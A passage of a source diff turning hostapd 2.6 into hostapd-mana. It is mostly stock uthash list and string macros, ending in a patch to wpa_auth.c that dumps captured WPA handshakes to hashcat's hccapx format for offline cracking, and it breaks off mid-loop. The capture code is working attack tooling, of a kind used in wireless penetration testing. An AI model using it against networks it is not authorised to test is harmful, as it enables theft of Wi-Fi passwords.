> #define LL_CONCAT(head1,head2)                                                                 \
>     LL_CONCAT2(head1,head2,next)
> 
> #define LL_CONCAT2(head1,head2,next)                                                           \
> do {                                                                                           \
>   LDECLTYPE(head1) _tmp;                                                                       \
>   if (head1) {                                                                                 \
>     _tmp = head1;                                                                              \
>     while (_tmp->next) { _tmp = _tmp->next; }                                                  \
>     _tmp->next=(head2);                                                                        \
>   } else {                                                                                     \
>     (head1)=(head2);                                                                           \
>   }                                                                                            \
> } while (0)
> 
> #define LL_APPEND(head,add)                                                                    \
>     LL_APPEND2(head,add,next)
> 
> #define LL_APPEND2(head,add,next)                                                              \
> do {                                                                                           \
>   LDECLTYPE(head) _tmp;                                                                        \
>   (add)->next=NULL;                                                                            \
>   if (head) {                                                                                  \
>     _tmp = head;                                                                               \
>     while (_tmp->next) { _tmp = _tmp->next; }                                                  \
>     _tmp->next=(add);                                                                          \
>   } else {                                                                                     \
>     (head)=(add);                                                                              \
>   }                                                                                            \
> } while (0)
> 
> #define LL_DELETE(head,del)                                                                    \
>     LL_DELETE2(head,del,next)
> 
> #define LL_DELETE2(head,del,next)                                                              \
> do {                                                                                           \
>   LDECLTYPE(head) _tmp;                                                                        \
>   if ((head) == (del)) {                                                                       \
>     (head)=(head)->next;                                                                       \
>   } else {                                                                                     \
>     _tmp = head;                                                                               \
>     while (_tmp->next && (_tmp->next != (del))) {                                              \
>       _tmp = _tmp->next;                                                                       \
>     }                                                                                          \
>     if (_tmp->next) {                                                                          \
>       _tmp->next = ((del)->next);                                                              \
>     }                                                                                          \
>   }                                                                                            \
> } while (0)
> 
> /* Here are VS2008 replacements for LL_APPEND and LL_DELETE */
> #define LL_APPEND_VS2008(head,add)                                                             \
>     LL_APPEND2_VS2008(head,add,next)
> 
> #define LL_APPEND2_VS2008(head,add,next)                                                       \
> do {                                                                                           \
>   if (head) {                                                                                  \
>     (add)->next = head;     /* use add->next as a temp variable */                             \
>     while ((add)->next->next) { (add)->next = (add)->next->next; }                             \
>     (add)->next->next=(add);                                                                   \
>   } else {                                                                                     \
>     (head)=(add);                                                                              \
>   }                                                                                            \
>   (add)->next=NULL;                                                                            \
> } while (0)
> 
> #define LL_DELETE_VS2008(head,del)                                                             \
>     LL_DELETE2_VS2008(head,del,next)
> 
> #define LL_DELETE2_VS2008(head,del,next)                                                       \
> do {                                                                                           \
>   if ((head) == (del)) {                                                                       \
>     (head)=(head)->next;                                                                       \
>   } else {                                                                                     \
>     char *_tmp = (char*)(head);                                                                \
>     while ((head)->next && ((head)->next != (del))) {                                          \
>       head = (head)->next;                                                                     \
>     }                                                                                          \
>     if ((head)->next) {                                                                        \
>       (head)->next = ((del)->next);                                                            \
>     }                                                                                          \
>     {                                                                                          \
>       char **_head_alias = (char**)&(head);                                                    \
>       *_head_alias = _tmp;                                                                     \
>     }                                                                                          \
>   }                                                                                            \
> } while (0)
> #ifdef NO_DECLTYPE
> #undef LL_APPEND
> #define LL_APPEND LL_APPEND_VS2008
> #undef LL_DELETE
> #define LL_DELETE LL_DELETE_VS2008
> #undef LL_DELETE2
> #define LL_DELETE2 LL_DELETE2_VS2008
> #undef LL_APPEND2
> #define LL_APPEND2 LL_APPEND2_VS2008
> #undef LL_CONCAT /* no LL_CONCAT_VS2008 */
> #undef DL_CONCAT /* no DL_CONCAT_VS2008 */
> #endif
> /* end VS2008 replacements */
> 
> #define LL_COUNT(head,el,counter)                                                              \
>     LL_COUNT2(head,el,counter,next)                                                            \
> 
> #define LL_COUNT2(head,el,counter,next)                                                        \
> {                                                                                              \
>     counter = 0;                                                                               \
>     LL_FOREACH2(head,el,next){ ++counter; }                                                    \
> }
> 
> #define LL_FOREACH(head,el)                                                                    \
>     LL_FOREACH2(head,el,next)
> 
> #define LL_FOREACH2(head,el,next)                                                              \
>     for(el=head;el;el=(el)->next)
> 
> #define LL_FOREACH_SAFE(head,el,tmp)                                                           \
>     LL_FOREACH_SAFE2(head,el,tmp,next)
> 
> #define LL_FOREACH_SAFE2(head,el,tmp,next)                                                     \
>   for((el)=(head);(el) && (tmp = (el)->next, 1); (el) = tmp)
> 
> #define LL_SEARCH_SCALAR(head,out,field,val)                                                   \
>     LL_SEARCH_SCALAR2(head,out,field,val,next)
> 
> #define LL_SEARCH_SCALAR2(head,out,field,val,next)                                             \
> do {                                                                                           \
>     LL_FOREACH2(head,out,next) {                                                               \
>       if ((out)->field == (val)) break;                                                        \
>     }                                                                                          \
> } while(0) 
> 
> #define LL_SEARCH(head,out,elt,cmp)                                                            \
>     LL_SEARCH2(head,out,elt,cmp,next)
> 
> #define LL_SEARCH2(head,out,elt,cmp,next)                                                      \
> do {                                                                                           \
>     LL_FOREACH2(head,out,next) {                                                               \
>       if ((cmp(out,elt))==0) break;                                                            \
>     }                                                                                          \
> } while(0) 
> 
> #define LL_REPLACE_ELEM(head, el, add)                                                         \
> do {                                                                                           \
>  LDECLTYPE(head) _tmp;                                                                         \
>  assert(head != NULL);                                                                         \
>  assert(el != NULL);                                                                           \
>  assert(add != NULL);                                                                          \
>  (add)->next = (el)->next;                                                                     \
>  if ((head) == (el)) {                                                                         \
>   (head) = (add);                                                                              \
>  } else {                                                                                      \
>   _tmp = head;                                                                                 \
>   while (_tmp->next && (_tmp->next != (el))) {                                                 \
>    _tmp = _tmp->next;                                                                          \
>   }                                                                                            \
>   if (_tmp->next) {                                                                            \
>     _tmp->next = (add);                                                                        \
>   }                                                                                            \
>  }                                                                                             \
> } while (0)
> 
> #define LL_PREPEND_ELEM(head, el, add)                                                         \
> do {                                                                                           \
>  LDECLTYPE(head) _tmp;                                                                         \
>  assert(head != NULL);                                                                         \
>  assert(el != NULL);                                                                           \
>  assert(add != NULL);                                                                          \
>  (add)->next = (el);                                                                           \
>  if ((head) == (el)) {                                                                         \
>   (head) = (add);                                                                              \
>  } else {                                                                                      \
>   _tmp = head;                                                                                 \
>   while (_tmp->next && (_tmp->next != (el))) {                                                 \
>    _tmp = _tmp->next;                                                                          \
>   }                                                                                            \
>   if (_tmp->next) {                                                                            \
>     _tmp->next = (add);                                                                        \
>   }                                                                                            \
>  }                                                                                             \
> } while (0)                                                                                    \
> 
> 
> /******************************************************************************
>  * doubly linked list macros (non-circular)                                   *
>  *****************************************************************************/
> #define DL_PREPEND(head,add)                                                                   \
>     DL_PREPEND2(head,add,prev,next)
> 
> #define DL_PREPEND2(head,add,prev,next)                                                        \
> do {                                                                                           \
>  (add)->next = head;                                                                           \
>  if (head) {                                                                                   \
>    (add)->prev = (head)->prev;                                                                 \
>    (head)->prev = (add);                                                                       \
>  } else {                                                                                      \
>    (add)->prev = (add);                                                                        \
>  }                                                                                             \
>  (head) = (add);                                                                               \
> } while (0)
> 
> #define DL_APPEND(head,add)                                                                    \
>     DL_APPEND2(head,add,prev,next)
> 
> #define DL_APPEND2(head,add,prev,next)                                                         \
> do {                                                                                           \
>   if (head) {                                                                                  \
>       (add)->prev = (head)->prev;                                                              \
>       (head)->prev->next = (add);                                                              \
>       (head)->prev = (add);                                                                    \
>       (add)->next = NULL;                                                                      \
>   } else {                                                                                     \
>       (head)=(add);                                                                            \
>       (head)->prev = (head);                                                                   \
>       (head)->next = NULL;                                                                     \
>   }                                                                                            \
> } while (0) 
> 
> #define DL_CONCAT(head1,head2)                                                                 \
>     DL_CONCAT2(head1,head2,prev,next)
> 
> #define DL_CONCAT2(head1,head2,prev,next)                                                      \
> do {                                                                                           \
>   LDECLTYPE(head1) _tmp;                                                                       \
>   if (head2) {                                                                                 \
>     if (head1) {                                                                               \
>         _tmp = (head2)->prev;                                                                  \
>         (head2)->prev = (head1)->prev;                                                         \
>         (head1)->prev->next = (head2);                                                         \
>         (head1)->prev = _tmp;                                                                  \
>     } else {                                                                                   \
>         (head1)=(head2);                                                                       \
>     }                                                                                          \
>   }                                                                                            \
> } while (0) 
> 
> #define DL_DELETE(head,del)                                                                    \
>     DL_DELETE2(head,del,prev,next)
> 
> #define DL_DELETE2(head,del,prev,next)                                                         \
> do {                                                                                           \
>   assert((del)->prev != NULL);                                                                 \
>   if ((del)->prev == (del)) {                                                                  \
>       (head)=NULL;                                                                             \
>   } else if ((del)==(head)) {                                                                  \
>       (del)->next->prev = (del)->prev;                                                         \
>       (head) = (del)->next;                                                                    \
>   } else {                                                                                     \
>       (del)->prev->next = (del)->next;                                                         \
>       if ((del)->next) {                                                                       \
>           (del)->next->prev = (del)->prev;                                                     \
>       } else {                                                                                 \
>           (head)->prev = (del)->prev;                                                          \
>       }                                                                                        \
>   }                                                                                            \
> } while (0) 
> 
> #define DL_COUNT(head,el,counter)                                                              \
>     DL_COUNT2(head,el,counter,next)                                                            \
> 
> #define DL_COUNT2(head,el,counter,next)                                                        \
> {                                                                                              \
>     counter = 0;                                                                               \
>     DL_FOREACH2(head,el,next){ ++counter; }                                                    \
> }
> 
> #define DL_FOREACH(head,el)                                                                    \
>     DL_FOREACH2(head,el,next)
> 
> #define DL_FOREACH2(head,el,next)                                                              \
>     for(el=head;el;el=(el)->next)
> 
> /* this version is safe for deleting the elements during iteration */
> #define DL_FOREACH_SAFE(head,el,tmp)                                                           \
>     DL_FOREACH_SAFE2(head,el,tmp,next)
> 
> #define DL_FOREACH_SAFE2(head,el,tmp,next)                                                     \
>   for((el)=(head);(el) && (tmp = (el)->next, 1); (el) = tmp)
> 
> /* these are identical to their singly-linked list counterparts */
> #define DL_SEARCH_SCALAR LL_SEARCH_SCALAR
> #define DL_SEARCH LL_SEARCH
> #define DL_SEARCH_SCALAR2 LL_SEARCH_SCALAR2
> #define DL_SEARCH2 LL_SEARCH2
> 
> #define DL_REPLACE_ELEM(head, el, add)                                                         \
> do {                                                                                           \
>  assert(head != NULL);                                                                         \
>  assert(el != NULL);                                                                           \
>  assert(add != NULL);                                                                          \
>  if ((head) == (el)) {                                                                         \
>   (head) = (add);                                                                              \
>   (add)->next = (el)->next;                                                                    \
>   if ((el)->next == NULL) {                                                                    \
>    (add)->prev = (add);                                                                        \
>   } else {                                                                                     \
>    (add)->prev = (el)->prev;                                                                   \
>    (add)->next->prev = (add);                                                                  \
>   }                                                                                            \
>  } else {                                                                                      \
>   (add)->next = (el)->next;                                                                    \
>   (add)->prev = (el)->prev;                                                                    \
>   (add)->prev->next = (add);                                                                   \
>   if ((el)->next == NULL) {                                                                    \
>    (head)->prev = (add);                                                                       \
>   } else {                                                                                     \
>    (add)->next->prev = (add);                                                                  \
>   }                                                                                            \
>  }                                                                                             \
> } while (0)
> 
> #define DL_PREPEND_ELEM(head, el, add)                                                         \
> do {                                                                                           \
>  assert(head != NULL);                                                                         \
>  assert(el != NULL);                                                                           \
>  assert(add != NULL);                                                                          \
>  (add)->next = (el);                                                                           \
>  (add)->prev = (el)->prev;                                                                     \
>  (el)->prev = (add);                                                                           \
>  if ((head) == (el)) {                                                                         \
>   (head) = (add);                                                                              \
>  } else {                                                                                      \
>   (add)->prev->next = (add);                                                                   \
>  }                                                                                             \
> } while (0)                                                                                    \
> 
> 
> /******************************************************************************
>  * circular doubly linked list macros                                         *
>  *****************************************************************************/
> #define CDL_PREPEND(head,add)                                                                  \
>     CDL_PREPEND2(head,add,prev,next)
> 
> #define CDL_PREPEND2(head,add,prev,next)                                                       \
> do {                                                                                           \
>  if (head) {                                                                                   \
>    (add)->prev = (head)->prev;                                                                 \
>    (add)->next = (head);                                                                       \
>    (head)->prev = (add);                                                                       \
>    (add)->prev->next = (add);                                                                  \
>  } else {                                                                                      \
>    (add)->prev = (add);                                                                        \
>    (add)->next = (add);                                                                        \
>  }                                                                                             \
> (head)=(add);                                                                                  \
> } while (0)
> 
> #define CDL_DELETE(head,del)                                                                   \
>     CDL_DELETE2(head,del,prev,next)
> 
> #define CDL_DELETE2(head,del,prev,next)                                                        \
> do {                                                                                           \
>   if ( ((head)==(del)) && ((head)->next == (head))) {                                          \
>       (head) = 0L;                                                                             \
>   } else {                                                                                     \
>      (del)->next->prev = (del)->prev;                                                          \
>      (del)->prev->next = (del)->next;                                                          \
>      if ((del) == (head)) (head)=(del)->next;                                                  \
>   }                                                                                            \
> } while (0) 
> 
> #define CDL_COUNT(head,el,counter)                                                             \
>     CDL_COUNT2(head,el,counter,next)                                                           \
> 
> #define CDL_COUNT2(head, el, counter,next)                                                     \
> {                                                                                              \
>     counter = 0;                                                                               \
>     CDL_FOREACH2(head,el,next){ ++counter; }                                                   \
> }
> 
> #define CDL_FOREACH(head,el)                                                                   \
>     CDL_FOREACH2(head,el,next)
> 
> #define CDL_FOREACH2(head,el,next)                                                             \
>     for(el=head;el;el=((el)->next==head ? 0L : (el)->next)) 
> 
> #define CDL_FOREACH_SAFE(head,el,tmp1,tmp2)                                                    \
>     CDL_FOREACH_SAFE2(head,el,tmp1,tmp2,prev,next)
> 
> #define CDL_FOREACH_SAFE2(head,el,tmp1,tmp2,prev,next)                                         \
>   for((el)=(head), ((tmp1)=(head)?((head)->prev):NULL);                                        \
>       (el) && ((tmp2)=(el)->next, 1);                                                          \
>       ((el) = (((el)==(tmp1)) ? 0L : (tmp2))))
> 
> #define CDL_SEARCH_SCALAR(head,out,field,val)                                                  \
>     CDL_SEARCH_SCALAR2(head,out,field,val,next)
> 
> #define CDL_SEARCH_SCALAR2(head,out,field,val,next)                                            \
> do {                                                                                           \
>     CDL_FOREACH2(head,out,next) {                                                              \
>       if ((out)->field == (val)) break;                                                        \
>     }                                                                                          \
> } while(0) 
> 
> #define CDL_SEARCH(head,out,elt,cmp)                                                           \
>     CDL_SEARCH2(head,out,elt,cmp,next)
> 
> #define CDL_SEARCH2(head,out,elt,cmp,next)                                                     \
> do {                                                                                           \
>     CDL_FOREACH2(head,out,next) {                                                              \
>       if ((cmp(out,elt))==0) break;                                                            \
>     }                                                                                          \
> } while(0) 
> 
> #define CDL_REPLACE_ELEM(head, el, add)                                                        \
> do {                                                                                           \
>  assert(head != NULL);                                                                         \
>  assert(el != NULL);                                                                           \
>  assert(add != NULL);                                                                          \
>  if ((el)->next == (el)) {                                                                     \
>   (add)->next = (add);                                                                         \
>   (add)->prev = (add);                                                                         \
>   (head) = (add);                                                                              \
>  } else {                                                                                      \
>   (add)->next = (el)->next;                                                                    \
>   (add)->prev = (el)->prev;                                                                    \
>   (add)->next->prev = (add);                                                                   \
>   (add)->prev->next = (add);                                                                   \
>   if ((head) == (el)) {                                                                        \
>    (head) = (add);                                                                             \
>   }                                                                                            \
>  }                                                                                             \
> } while (0)
> 
> #define CDL_PREPEND_ELEM(head, el, add)                                                        \
> do {                                                                                           \
>  assert(head != NULL);                                                                         \
>  assert(el != NULL);                                                                           \
>  assert(add != NULL);                                                                          \
>  (add)->next = (el);                                                                           \
>  (add)->prev = (el)->prev;                                                                     \
>  (el)->prev = (add);                                                                           \
>  (add)->prev->next = (add);                                                                    \
>  if ((head) == (el)) {                                                                         \
>   (head) = (add);                                                                              \
>  }                                                                                             \
> } while (0)                                                                                    \
> 
> #endif /* UTLIST_H */
> 
diff '--color=auto' -rN hostapd-2.6/src/ap/uthash/utstring.h hostapd-mana/src/ap/uthash/utstring.h
0a1,393
> /*
> Copyright (c) 2008-2014, Troy D. Hanson   http://troydhanson.github.com/uthash/
> All rights reserved.
> 
> Redistribution and use in source and binary forms, with or without
> modification, are permitted provided that the following conditions are met:
> 
>     * Redistributions of source code must retain the above copyright
>       notice, this list of conditions and the following disclaimer.
> 
> THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS
> IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
> TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
> PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER
> OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
> EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
> PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
> LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
> NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
> SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
> */
> 
> /* a dynamic string implementation using macros 
>  */
> #ifndef UTSTRING_H
> #define UTSTRING_H
> 
> #define UTSTRING_VERSION 1.9.9
> 
> #ifdef __GNUC__
> #define _UNUSED_ __attribute__ ((__unused__)) 
> #else
> #define _UNUSED_ 
> #endif
> 
> #include <stdlib.h>
> #include <sys/types.h>  /* ssize_t */
> #include <string.h>
> #include <stdarg.h>
> #define oom() exit(-1)
> 
> typedef struct {
>     char *d;
>     size_t n; /* allocd size */
>     size_t i; /* index of first unused byte */
> } UT_string;
> 
> #define utstring_reserve(s,amt)                            \
> do {                                                       \
>   if (((s)->n - (s)->i) < (size_t)(amt)) {                 \
>      (s)->d = (char*)realloc((s)->d, (s)->n + amt);        \
>      if ((s)->d == NULL) oom();                            \
>      (s)->n += amt;                                        \
>   }                                                        \
> } while(0)
> 
> #define utstring_init(s)                                   \
> do {                                                       \
>   (s)->n = 0; (s)->i = 0; (s)->d = NULL;                   \
>   utstring_reserve(s,100);                                 \
>   (s)->d[0] = '\0'; \
> } while(0)
> 
> #define utstring_done(s)                                   \
> do {                                                       \
>   if ((s)->d != NULL) free((s)->d);                        \
>   (s)->n = 0;                                              \
> } while(0)
> 
> #define utstring_free(s)                                   \
> do {                                                       \
>   utstring_done(s);                                        \
>   free(s);                                                 \
> } while(0)
> 
> #define utstring_new(s)                                    \
> do {                                                       \
>    s = (UT_string*)calloc(sizeof(UT_string),1);            \
>    if (!s) oom();                                          \
>    utstring_init(s);                                       \
> } while(0)
> 
> #define utstring_renew(s)                                  \
> do {                                                       \
>    if (s) {                                                \
>      utstring_clear(s);                                    \
>    } else {                                                \
>      utstring_new(s);                                      \
>    }                                                       \
> } while(0)
> 
> #define utstring_clear(s)                                  \
> do {                                                       \
>   (s)->i = 0;                                              \
>   (s)->d[0] = '\0';                                        \
> } while(0)
> 
> #define utstring_bincpy(s,b,l)                             \
> do {                                                       \
>   utstring_reserve((s),(l)+1);                               \
>   if (l) memcpy(&(s)->d[(s)->i], b, l);                    \
>   (s)->i += l;                                               \
>   (s)->d[(s)->i]='\0';                                         \
> } while(0)
> 
> #define utstring_concat(dst,src)                                 \
> do {                                                             \
>   utstring_reserve((dst),((src)->i)+1);                          \
>   if ((src)->i) memcpy(&(dst)->d[(dst)->i], (src)->d, (src)->i); \
>   (dst)->i += (src)->i;                                          \
>   (dst)->d[(dst)->i]='\0';                                       \
> } while(0)
> 
> #define utstring_len(s) ((unsigned)((s)->i))
> 
> #define utstring_body(s) ((s)->d)
> 
> _UNUSED_ static void utstring_printf_va(UT_string *s, const char *fmt, va_list ap) {
>    int n;
>    va_list cp;
>    while (1) {
> #ifdef _WIN32
>       cp = ap;
> #else
>       va_copy(cp, ap);
> #endif
>       n = vsnprintf (&s->d[s->i], s->n-s->i, fmt, cp);
>       va_end(cp);
> 
>       if ((n > -1) && ((size_t) n < (s->n-s->i))) {
>         s->i += n;
>         return;
>       }
> 
>       /* Else try again with more space. */
>       if (n > -1) utstring_reserve(s,n+1); /* exact */
>       else utstring_reserve(s,(s->n)*2);   /* 2x */
>    }
> }
> #ifdef __GNUC__
> /* support printf format checking (2=the format string, 3=start of varargs) */
> static void utstring_printf(UT_string *s, const char *fmt, ...)
>   __attribute__ (( format( printf, 2, 3) ));
> #endif
> _UNUSED_ static void utstring_printf(UT_string *s, const char *fmt, ...) {
>    va_list ap;
>    va_start(ap,fmt);
>    utstring_printf_va(s,fmt,ap);
>    va_end(ap);
> }
> 
> /*******************************************************************************
>  * begin substring search functions                                            *
>  ******************************************************************************/
> /* Build KMP table from left to right. */
> _UNUSED_ static void _utstring_BuildTable(
>     const char *P_Needle, 
>     ssize_t P_NeedleLen, 
>     long *P_KMP_Table)
> {
>     long i, j;
> 
>     i = 0;
>     j = i - 1;
>     P_KMP_Table[i] = j;
>     while (i < P_NeedleLen)
>     {
>         while ( (j > -1) && (P_Needle[i] != P_Needle[j]) )
>         {
>            j = P_KMP_Table[j];
>         }
>         i++;
>         j++;
>         if (i < P_NeedleLen)
>         {
>             if (P_Needle[i] == P_Needle[j])
>             {
>                 P_KMP_Table[i] = P_KMP_Table[j];
>             }
>             else
>             {
>                 P_KMP_Table[i] = j;
>             }
>         }
>         else
>         {
>             P_KMP_Table[i] = j;
>         }
>     }
> 
>     return;
> }
> 
> 
> /* Build KMP table from right to left. */
> _UNUSED_ static void _utstring_BuildTableR(
>     const char *P_Needle, 
>     ssize_t P_NeedleLen, 
>     long *P_KMP_Table)
> {
>     long i, j;
> 
>     i = P_NeedleLen - 1;
>     j = i + 1;
>     P_KMP_Table[i + 1] = j;
>     while (i >= 0)
>     {
>         while ( (j < P_NeedleLen) && (P_Needle[i] != P_Needle[j]) )
>         {
>            j = P_KMP_Table[j + 1];
>         }
>         i--;
>         j--;
>         if (i >= 0)
>         {
>             if (P_Needle[i] == P_Needle[j])
>             {
>                 P_KMP_Table[i + 1] = P_KMP_Table[j + 1];
>             }
>             else
>             {
>                 P_KMP_Table[i + 1] = j;
>             }
>         }
>         else
>         {
>             P_KMP_Table[i + 1] = j;
>         }
>     }
> 
>     return;
> }
> 
> 
> /* Search data from left to right. ( Multiple search mode. ) */
> _UNUSED_ static long _utstring_find(
>     const char *P_Haystack, 
>     size_t P_HaystackLen, 
>     const char *P_Needle, 
>     size_t P_NeedleLen, 
>     long *P_KMP_Table)
> {
>     long i, j;
>     long V_FindPosition = -1;
> 
>     /* Search from left to right. */
>     i = j = 0;
>     while ( (j < (int)P_HaystackLen) && (((P_HaystackLen - j) + i) >= P_NeedleLen) )
>     {
>         while ( (i > -1) && (P_Needle[i] != P_Haystack[j]) )
>         {
>             i = P_KMP_Table[i];
>         }
>         i++;
>         j++;
>         if (i >= (int)P_NeedleLen)
>         {
>             /* Found. */
>             V_FindPosition = j - i;
>             break;
>         }
>     }
> 
>     return V_FindPosition;
> }
> 
> 
> /* Search data from right to left. ( Multiple search mode. ) */
> _UNUSED_ static long _utstring_findR(
>     const char *P_Haystack, 
>     size_t P_HaystackLen, 
>     const char *P_Needle, 
>     size_t P_NeedleLen, 
>     long *P_KMP_Table)
> {
>     long i, j;
>     long V_FindPosition = -1;
> 
>     /* Search from right to left. */
>     j = (P_HaystackLen - 1);
>     i = (P_NeedleLen - 1);
>     while ( (j >= 0) && (j >= i) )
>     {
>         while ( (i < (int)P_NeedleLen) && (P_Needle[i] != P_Haystack[j]) )
>         {
>             i = P_KMP_Table[i + 1];
>         }
>         i--;
>         j--;
>         if (i < 0)
>         {
>             /* Found. */
>             V_FindPosition = j + 1;
>             break;
>         }
>     }
> 
>     return V_FindPosition;
> }
> 
> 
> /* Search data from left to right. ( One time search mode. ) */
> _UNUSED_ static long utstring_find(
>     UT_string *s, 
>     long P_StartPosition,   /* Start from 0. -1 means last position. */
>     const char *P_Needle, 
>     ssize_t P_NeedleLen)
> {
>     long V_StartPosition;
>     long V_HaystackLen;
>     long *V_KMP_Table;
>     long V_FindPosition = -1;
> 
>     if (P_StartPosition < 0)
>     {
>         V_StartPosition = s->i + P_StartPosition;
>     }
>     else
>     {
>         V_StartPosition = P_StartPosition;
>     }
>     V_HaystackLen = s->i - V_StartPosition;
>     if ( (V_HaystackLen >= P_NeedleLen) && (P_NeedleLen > 0) )
>     {
>         V_KMP_Table = (long *)malloc(sizeof(long) * (P_NeedleLen + 1));
>         if (V_KMP_Table != NULL)
>         {
>             _utstring_BuildTable(P_Needle, P_NeedleLen, V_KMP_Table);
> 
>             V_FindPosition = _utstring_find(s->d + V_StartPosition, 
>                                             V_HaystackLen, 
>                                             P_Needle, 
>                                             P_NeedleLen, 
>                                             V_KMP_Table);
>             if (V_FindPosition >= 0)
>             {
>                 V_FindPosition += V_StartPosition;
>             }
> 
>             free(V_KMP_Table);
>         }
>     }
> 
>     return V_FindPosition;
> }
> 
> 
> /* Search data from right to left. ( One time search mode. ) */
> _UNUSED_ static long utstring_findR(
>     UT_string *s, 
>     long P_StartPosition,   /* Start from 0. -1 means last position. */
>     const char *P_Needle, 
>     ssize_t P_NeedleLen)
> {
>     long V_StartPosition;
>     long V_HaystackLen;
>     long *V_KMP_Table;
>     long V_FindPosition = -1;
> 
>     if (P_StartPosition < 0)
>     {
>         V_StartPosition = s->i + P_StartPosition;
>     }
>     else
>     {
>         V_StartPosition = P_StartPosition;
>     }
>     V_HaystackLen = V_StartPosition + 1;
>     if ( (V_HaystackLen >= P_NeedleLen) && (P_NeedleLen > 0) )
>     {
>         V_KMP_Table = (long *)malloc(sizeof(long) * (P_NeedleLen + 1));
>         if (V_KMP_Table != NULL)
>         {
>             _utstring_BuildTableR(P_Needle, P_NeedleLen, V_KMP_Table);
> 
>             V_FindPosition = _utstring_findR(s->d, 
>                                              V_HaystackLen, 
>                                              P_Needle, 
>                                              P_NeedleLen, 
>                                              V_KMP_Table);
> 
>             free(V_KMP_Table);
>         }
>     }
> 
>     return V_FindPosition;
> }
> /*******************************************************************************
>  * end substring search functions                                              *
>  ******************************************************************************/
> 
> #endif /* UTSTRING_H */
diff '--color=auto' -rN hostapd-2.6/src/ap/wpa_auth.c hostapd-mana/src/ap/wpa_auth.c
27a28
> #include "common/mana.h" //MANA
949a951,1030
> 	//MANA Start
> 	/*
> 	// Output hashcat's hccapx format, documented at
> 	// https://hashcat.net/wiki/docu.php?id=hccapx
> 	// Signature 0x58504348
> 	// Version 4 
> 	// Message Pair 0 aka M1 + M2
> 	wpa_printf(MSG_DEBUG, "MANA SSID len: %lu", wpa_auth->conf.ssid_len);
> 	wpa_printf(MSG_DEBUG, "MANA SSID: %s", wpa_auth->conf.ssid);
> 	wpa_printf(MSG_DEBUG, "MANA Key Type: %u", key->type);
> 	wpa_printf(MSG_DEBUG, "MANA MIC Length: %lu", mic_len);
> 	wpa_hexdump(MSG_DEBUG, "MANA MIC: ", mic_len == 24 ? key192->key_mic : key->key_mic, mic_len);
> 	wpa_printf(MSG_DEBUG, "MANA BSSID: " MACSTR, MAC2STR(sm->wpa_auth->addr));
> 	wpa_hexdump(MSG_DEBUG, "MANA ANonce: ", sm->ANonce, WPA_NONCE_LEN);
> 	wpa_printf(MSG_DEBUG, "MANA STA MAC: " MACSTR, MAC2STR(sm->addr));
> 	wpa_hexdump(MSG_DEBUG, "MANA SNonce: ", key->key_nonce, WPA_NONCE_LEN);
> 	wpa_printf(MSG_DEBUG, "MANA EAPOL Key Data Length: %u", key_data_length);
> 	wpa_hexdump(MSG_DEBUG, "MANA EAPOL Key Data: ", key_data, key_data_length);
> 	wpa_printf(MSG_DEBUG, "MANA EAPOL Data Length: %lu", data_len);
> 	wpa_hexdump(MSG_DEBUG, "MANA EAPOL Data: ", data, data_len);
> 	*/
> 
> 	if (os_strcmp("NOT_SET",mana.conf->mana_wpaout)!=0) {
> 		FILE *hccapx = fopen(mana.conf->mana_wpaout, "ab");
> 		if (hccapx != NULL) {
> 			fwrite("\x48\x43\x50\x58",4,1,hccapx); //Signature
> 			fwrite("\x04\x00\x00\x00",4,1,hccapx); //Version
> 			fwrite("\x00",1,1,hccapx); //Message Pair (M1+M2)
> 			fwrite(&wpa_auth->conf.ssid_len,1,1,hccapx);
> 			fwrite(wpa_auth->conf.ssid,32,1,hccapx);
> 			fwrite(&key->type,1,1,hccapx);
> 			fwrite(mic_len == 24 ? key192->key_mic : key->key_mic,16,1,hccapx); //hashcat truncates to 16
> 			fwrite(sm->wpa_auth->addr,ETH_ALEN,1,hccapx);
> 			fwrite(sm->ANonce,WPA_NONCE_LEN,1,hccapx);
> 			fwrite(sm->addr,ETH_ALEN,1,hccapx);
> 			fwrite(key->key_nonce,WPA_NONCE_LEN,1,hccapx);
> 			fwrite(&data_len,2,1,hccapx);
> 			fwrite(hdr,sizeof(*hdr),1,hccapx);
> 			// Now follows a ridiculous amount of code to handle simply blanking the MIC
> 			// as per https://github.com/hashcat/hashcat-utils/blob/master/src/cap2hccapx.c#L611
> 			// I did use some simpler memcpy's but it lead to weird segfaults in seemingly
> 			// unrelated functions. This, while long, explains the contents better.
> 			int i;
> 			if (mic_len == 24) {
> 				fwrite(&key192->type,1,1,hccapx);
> 				fwrite(key192->key_info,2,1,hccapx);
> 				fwrite(key192->key_length,2,1,hccapx);
> 				fwrite(key192->replay_counter,WPA_REPLAY_COUNTER_LEN,1,hccapx);
> 				fwrite(key192->key_nonce,WPA_NONCE_LEN,1,hccapx);
> 				fwrite(key192->key_iv,16,1,hccapx);
> 				fwrite(key192->key_rsc,WPA_KEY_RSC_LEN,1,hccapx);
> 				fwrite(key192->key_id,8,1,hccapx);
> 				for (i=0;i<16;i++) //hccapx truncates to 16
> 					fwrite("\x00",1,1,hccapx);
> 				fwrite(key192->key_data_length,2,1,hccapx);
> 				fwrite(key192+1,WPA_GET_BE16(key192->key_data_length),1,hccapx);
> 			} else {
> 				fwrite(&key->type,1,1,hccapx);
> 				fwrite(key->key_info,2,1,hccapx);
> 				fwrite(key->key_length,2,1,hccapx);
> 				fwrite(key->replay_counter,WPA_REPLAY_COUNTER_LEN,1,hccapx);
> 				fwrite(key->key_nonce,WPA_NONCE_LEN,1,hccapx);
> 				fwrite(key->key_iv,16,1,hccapx);
> 				fwrite(key->key_rsc,WPA_KEY_RSC_LEN,1,hccapx);
> 				fwrite(key->key_id,8,1,hccapx);
> 				for (i=0;i<16;i++)
